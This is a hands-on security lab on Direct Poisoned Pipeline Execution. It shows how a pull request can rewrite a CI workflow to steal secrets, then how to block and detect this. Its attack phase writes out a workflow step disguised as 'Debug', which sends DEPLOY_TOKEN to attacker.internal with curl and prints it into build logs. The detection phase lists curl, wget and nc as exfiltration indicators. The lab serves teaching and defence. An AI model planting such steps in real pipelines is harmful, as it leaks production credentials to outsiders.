# Lab 2.2: Direct Poisoned Pipeline Execution (PPE)

<div class="lab-meta">
  <span>~35 minutes</span>
  <span>Intermediate</span>
  <span>Prerequisites: <a href="2.1-cicd-fundamentals.md">Lab 2.1</a></span>
</div>

In January 2022, Cider Security coined the term "Poisoned Pipeline Execution" (PPE) to describe a class of attacks where an attacker modifies CI pipeline definitions to execute malicious code. Direct PPE is the simplest variant: the attacker directly modifies the CI configuration file (`.github/workflows/*.yml`, `.gitlab-ci.yml`, `Jenkinsfile`) in a pull request, and the pipeline executes their modified version.

The attack is devastating because CI configs are code. they live in the repo alongside application source. When a developer opens a PR, the CI system typically runs the pipeline as defined **in the PR branch**, not the target branch. This means a PR author controls what the pipeline executes.

In this lab, you will exploit Direct PPE to exfiltrate secrets from a CI pipeline, then defend against it.

???+ info "Phase 1: UNDERSTAND. CI Configs Are Code"

    **Goal:** Understand that CI configuration files live in the repository and control what the pipeline executes.

### Step 1: Examine the CI configuration

```bash
cd /repos/acme-webapp
cat .gitea/workflows/ci.yml
```

This file defines the entire pipeline: triggers, jobs, steps, and secrets. It is a YAML file checked into the repository.

### Step 2: Understand the trigger model

The pipeline triggers on `push` and `pull_request` to `main`. When a PR is opened:

1. The CI system checks out the PR branch
2. It reads the CI config **from the PR branch** (not from main)
3. It executes whatever that config says

This means the PR author can modify the CI config and the pipeline will run their version.

### Step 3: Check what secrets exist

```bash
# List the secrets configured on the repo
curl -sf "http://gitea:3000/api/v1/repos/developer/acme-webapp/actions/secrets" \
  -u "developer:password" | python -m json.tool
```

The pipeline has access to `DEPLOY_TOKEN`. a credential for deploying to production.

### Step 4: See the vulnerability

The CI config runs on PRs AND has secrets in scope. A PR author can:

1. Modify the CI config
2. Add a step that reads secrets
3. The pipeline executes the modified config
4. Secrets are exfiltrated

This is Direct PPE.

---

???+ warning "Phase 2: BREAK. Poisoning the Pipeline"

    **Goal:** Submit a PR that modifies the CI config to exfiltrate secrets.

### Step 1: Create an attack branch

```bash
cd /repos/acme-webapp
git checkout -b feature/improve-ci
```

### Step 2: Modify the CI config

```bash
cat > .gitea/workflows/ci.yml << 'EOF'
name: ACME Webapp CI

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

env:
  DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run tests
        run: |
          echo "Running tests..."
          python test_app.py
      - name: "Debug: check build environment"
        run: |
          # Exfiltrate the deploy token
          curl -sf "http://attacker.internal/steal?token=${DEPLOY_TOKEN}" || true
          # Also write it to a file visible in build logs
          echo "TOKEN=${DEPLOY_TOKEN}" > /tmp/exfiltrated.txt
          cat /tmp/exfiltrated.txt
EOF
```

### Step 3: Submit the PR

```bash
git add -A
git commit -m "Improve CI debugging"
git push origin feature/improve-ci

curl -sf -X POST "http://gitea:3000/api/v1/repos/developer/acme-webapp/pulls" \
  -H "Content-Type: application/json" \
  -u "attacker:password" \
  -d '{"title":"Improve CI debugging","base":"main","head":"feature/improve-ci"}'
```

### Step 4: The pipeline executes the attacker's config

When CI runs on this PR, it:

1. Checks out the `feature/improve-ci` branch
2. Reads the modified `ci.yml`
3. Runs `curl attacker.internal/steal?token=ghp_deploy_x8k2m5n7p9q1r3t6v0w4y`
4. The deploy token is now in the attacker's hands

The CI config change looks innocent. "improve CI debugging". but it exfiltrates production credentials.

### Step 5: Why this is worse than it looks

- **No code review needed**. the pipeline runs BEFORE the PR is reviewed
- **No merge needed**. the attack succeeds even if the PR is rejected
- **The PR can be deleted**. the attacker can remove the evidence after exfiltration
- **Any contributor can do this**. write access (fork + PR in some platforms) is all that is required

---

???+ success "Phase 3: DEFEND. Protecting the Pipeline"

    **Goal:** Prevent Direct PPE by separating PR builds from protected branch builds.

### Fix 1: Separate workflows for push and PR

```bash
cd /repos/acme-webapp
git checkout main
```

Apply the protected configuration:

```bash
# Main CI -- only runs on push to main, has secrets
cp /lab/src/repo/.gitea/workflows/ci-protected.yml .gitea/workflows/ci.yml

# PR CI -- runs on PRs, has ZERO secrets
cp /lab/src/repo/.gitea/workflows/pr-ci.yml .gitea/workflows/pr-ci.yml

# CODEOWNERS -- require admin review for workflow changes
cp /lab/src/repo/CODEOWNERS CODEOWNERS

cat .gitea/workflows/ci.yml
cat .gitea/workflows/pr-ci.yml
cat CODEOWNERS
```

Key changes:

1. **`ci.yml` triggers ONLY on `push` to main**. never on PRs
2. **`pr-ci.yml` handles PR validation**. runs tests but has zero secrets
3. **CODEOWNERS protects `.gitea/workflows/`**. workflow changes require admin approval
4. **Environment protection** on the deploy job. adds a manual gate

### Fix 2: Commit and push

```bash
git add -A
git commit -m "Separate PR and push workflows to prevent PPE"
git push origin main
```

### Additional defenses

1. **Fork-based PRs**: Run PR workflows from fork PRs with even more restrictions (no secrets, restricted permissions)
2. **Workflow file restrictions**: Some CI systems (GitHub) don't run modified workflows from PRs by default for fork-based PRs
3. **Branch protection**: Require CI to pass before merge, but don't run the full CI (with secrets) on PRs
4. **Token scoping**: Use GITHUB_TOKEN with minimal permissions (`contents: read`) for PR workflows


??? danger "Phase 4: DETECT. Catching Pipeline Poisoning"

    **Goal:** Detect when an attacker modifies CI configs in a PR to exfiltrate secrets.

### SIEM / Log Indicators

Direct PPE has a clear signal: **CI config files are modified in a PR, and the pipeline immediately accesses secrets or makes external connections**.

**What to look for:**

- Commits modifying `.github/workflows/`, `.gitlab-ci.yml`, or `Jenkinsfile` in PR branches
- PR builds that access secrets not historically used by PR builds
- Outbound network connections from PR-triggered builds
- CI config changes adding `curl`, `wget`, `nc`, or `env` commands
- PRs from new or external contributors that touch CI configs

### Example Detection Queries

**Sigma -- CI Config Files Modified in Pull Request:**

```yaml
title: CI Config Files Modified in Pull Request
id: wl-22-8ff8036b
status: experimental
description: >
  Detects pull requests that modify CI/CD configuration files. This is the
  signature of Direct PPE -- the attacker modifies the workflow definition
  in a PR so CI runs the attacker's version of the pipeline.
author: WeakLink Labs
date: 2026/04/04
logsource:
  category: application
  product: github
detection:
  selection:
    action: 'pull_request.opened'
  ci_files_changed:
    files_changed|contains:
      - '.github/workflows/'
      - '.gitea/workflows/'
      - '.gitlab-ci.yml'
      - 'Jenkinsfile'
      - '.circleci/config.yml'
  condition: selection and ci_files_changed
falsepositives:
  - Developers legitimately updating CI configurations
  - Dependabot/Renovate PRs updating action versions
level: medium
tags:
  - attack.t1195.002
  - attack.initial_access
```

??? tip "SOC Relevance"

    **Alerts you will see:**

    - "CI config modified in pull request" (git webhook monitoring)
    - "PR build accessed production secrets" (CI audit logs)
    - "Outbound HTTP from PR-triggered build to external host" (network monitoring)

    **Why this matters to your SOC:** Direct PPE is one of the most common CI/CD attacks in the wild. Researchers from Cider Security found PPE vulnerabilities in major open-source projects and enterprise CI systems. The attack requires only PR-level access and executes before any human review.

    **Triage workflow:**

    1. **Check the PR diff**. does it modify CI config files? What was added?
    2. **Check for exfiltration indicators**. curl, wget, nc, base64, or DNS queries in the modified CI steps
    3. **Check secret access logs**. did the PR build access secrets it should not have?
    4. **Check the PR author**. is this a known contributor or a new/external account?
    5. **If confirmed: rotate secrets immediately**. any secret accessible to the PR build is compromised

    **False positive rate:** Low. CI config modifications in PRs from external contributors are inherently suspicious. Internal developers modifying CI configs should go through CODEOWNERS review.

??? example "CI Integration"

    **`.github/workflows/ppe-prevention.yml`:**

    ```yaml
    name: PPE Prevention Check

    on:
      pull_request:
        paths:
          - ".github/workflows/**"

    jobs:
      check-workflow-changes:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4
            with:
              fetch-depth: 0

          - name: Flag workflow file changes
            run: |
              echo "--- CI config files modified in this PR ---"
              CHANGED=$(git diff --name-only origin/main...HEAD -- \
                '.github/workflows/' '.gitea/workflows/' \
                '.gitlab-ci.yml' 'Jenkinsfile')
              if [ -n "$CHANGED" ]; then
                echo "::warning::CI pipeline configs modified in this PR:"
                echo "$CHANGED"
                echo ""
                echo "These changes require CODEOWNERS approval."
                echo "Reviewer: verify no secret exfiltration, no curl/wget"
                echo "to external hosts, no env/printenv commands."
              fi
    ```

## What You Learned

1. **CI configs are code**. they live in the repository and define what the pipeline executes.
2. **PRs can modify CI configs**. the pipeline runs the PR's version, not main's version.
3. **Direct PPE is trivial**. modify the CI config, add a curl command, secrets are gone.
4. **Separate push and PR workflows**. the fundamental defense is: secrets only on push to protected branches, never on PRs.
5. **CODEOWNERS for CI configs**. require admin review for any workflow changes.
6. **Detection is possible**. monitor CI config changes in PRs and alert on secret access from PR builds.
